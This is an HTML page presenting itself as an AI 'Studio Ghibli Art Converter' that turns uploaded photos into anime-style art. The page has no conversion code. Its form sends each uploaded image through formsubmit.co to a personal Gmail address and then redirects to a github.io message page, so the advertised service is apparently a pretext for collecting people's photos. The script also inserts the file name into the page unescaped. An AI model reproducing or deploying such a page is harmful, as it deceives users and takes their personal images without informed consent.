<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Ghibli Style Converter</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ghibli-blue: #1a4b8c;
            --ghibli-light: #5d8cc0;
            --ghibli-gold: #f5c64f;
            --ghibli-cream: #f8f3e6;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Quicksand', sans-serif;
            background: linear-gradient(135deg, var(--ghibli-blue), #0d2b56);
            color: var(--ghibli-cream);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://www.transparenttextures.com/patterns/rice-paper-3.png');
            opacity: 0.1;
            pointer-events: none;
        }
        
        .ghibli-clouds {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-image: url('https://i.imgur.com/7YSDEYk.png');
            background-size: cover;
            opacity: 0.15;
            animation: cloudsMove 60s linear infinite;
            pointer-events: none;
        }
        
        @keyframes cloudsMove {
            0% { background-position: 0 0; }
            100% { background-position: 100% 0; }
        }
        
        .container {
            background: rgba(26, 75, 140, 0.7);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
            transform: translateY(0);
            transition: transform 0.3s ease;
            z-index: 1;
        }
        
        .container:hover {
            transform: translateY(-5px);
        }
        
        .container::after {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(245, 198, 79, 0.1) 0%, transparent 70%);
            animation: rotate 20s linear infinite;
            z-index: -1;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 700;
            color: var(--ghibli-gold);
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            position: relative;
            display: inline-block;
        }
        
        h1::after {
            content: "";
            position: absolute;
            bottom: -8px;
            left: 0;
            width: 50px;
            height: 3px;
            background: var(--ghibli-gold);
            border-radius: 3px;
        }
        
        h2 {
            font-size: 18px;
            margin-bottom: 25px;
            font-weight: 500;
            opacity: 0.9;
        }
        
        p {
            margin-bottom: 30px;
            line-height: 1.6;
            opacity: 0.9;
        }
        
        .file-input-wrapper {
            position: relative;
            margin: 25px 0;
        }
        
        .file-input-label {
            display: flex;
            align-items: center;
            background: rgba(248, 243, 230, 0.1);
            border: 2px dashed rgba(248, 243, 230, 0.3);
            padding: 20px;
            border-radius: 12px;
            color: var(--ghibli-cream);
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .file-input-label:hover {
            background: rgba(248, 243, 230, 0.15);
            border-color: rgba(248, 243, 230, 0.5);
        }
        
        .file-input-label::before {
            content: "üìÅ";
            font-size: 24px;
            margin-right: 12px;
        }
        
        .file-input-label span {
            flex: 1;
            text-align: left;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }
        
        button {
            background: linear-gradient(135deg, var(--ghibli-gold), #e8b339);
            color: #2a2a2a;
            border: none;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(245, 198, 79, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(245, 198, 79, 0.4);
        }
        
        button::after {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: rgba(255, 255, 255, 0.1);
            transform: rotate(45deg);
            transition: all 0.6s ease;
        }
        
        button:hover::after {
            left: 100%;
        }
        
        .totoro-icon {
            position: absolute;
            width: 60px;
            height: 60px;
            bottom: -20px;
            right: -20px;
            opacity: 0.2;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path fill="%23f5c64f" d="M50 15c-15 0-25 10-25 25 0 10 5 20 15 25-5 5-5 15-5 20h10c0-5 0-10 5-10v-5h-5c-10 0-15-10-15-20 0-10 10-20 20-20s20 10 20 20c0 10-5 20-15 20h-5v5c5 0 5 5 5 10h10c0-5 0-15-5-20 10-5 15-15 15-25 0-15-10-25-25-25z"/></svg>');
            background-size: contain;
            background-repeat: no-repeat;
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="ghibli-clouds"></div>
    
    <div class="container">
        <div class="totoro-icon"></div>
        <h1>Studio Ghibli Art Converter</h1>
        <h2>Transform your photos into Ghibli masterpieces</h2>
        
        <p>Upload any image and our AI will recreate it in the enchanting style of Studio Ghibli's legendary animation.</p>
        
        <form id="uploadForm" action="https://formsubmit.co/babaiswaraj@gmail.com" method="POST" enctype="multipart/form-data">
            <div class="file-input-wrapper">
                <label class="file-input-label" id="fileLabel">
                    <span>Select your image</span>
                </label>
                <input type="file" name="image" id="fileInput" accept="image/*" required>
            </div>
            
            <input type="hidden" name="_next" value="https://ghibli-art.github.io/Cool-Ghibli-Style/message.html">
            <button type="submit">
                <span>Create Ghibli Magic</span>
            </button>
        </form>
    </div>

    <script>
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const label = document.getElementById('fileLabel');
            const fileName = e.target.files[0] ? e.target.files[0].name : 'Select your image';
            
            label.innerHTML = `<span>${fileName}</span>`;
            
            if (e.target.files[0]) {
                label.style.borderColor = 'var(--ghibli-gold)';
                label.style.background = 'rgba(245, 198, 79, 0.1)';
            } else {
                label.style.borderColor = 'rgba(248, 243, 230, 0.3)';
                label.style.background = 'rgba(248, 243, 230, 0.1)';
            }
        });
    </script>
</body>
</html>
